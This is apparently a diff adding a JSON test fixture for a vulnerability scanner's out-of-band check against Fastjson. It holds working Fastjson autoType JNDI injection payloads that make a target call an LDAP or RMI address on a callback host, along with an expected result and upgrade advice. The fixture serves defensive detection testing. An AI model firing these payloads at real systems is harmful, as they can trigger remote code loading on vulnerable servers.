@@ -1,0 +1,19 @@
+{
+  "engine": "framework_zero_day_engines._run_oob_scan",
+  "kwargs": {
+    "engine_name": "Fastjson",
+    "url": "https://target.example/json",
+    "param": "data",
+    "parsed_query": "data=x",
+    "payload_templates": [
+      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{OBS_DNS}/a\",\"autoCommit\":true}",
+      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{OBS_DNS}/a\",\"autoCommit\":true}",
+      "{\"@type\":\"java.net.Inet4Address\",\"val\":\"{OBS_DNS}\"}"
+    ],
+    "type_label": "Fastjson JNDI 注入",
+    "evidence_note": "fastjson fixture positive: 注入 autoType 外带载荷并命中 OOB 回调",
+    "recommendation": "升级 Fastjson 至 1.2.83+ 或 2.x，或改用 Jackson 并配置安全后备",
+    "oob_wait": 1
+  },
+  "expected": {"not_none": true, "type": "Fastjson JNDI 注入(带外实锤)"}
+}
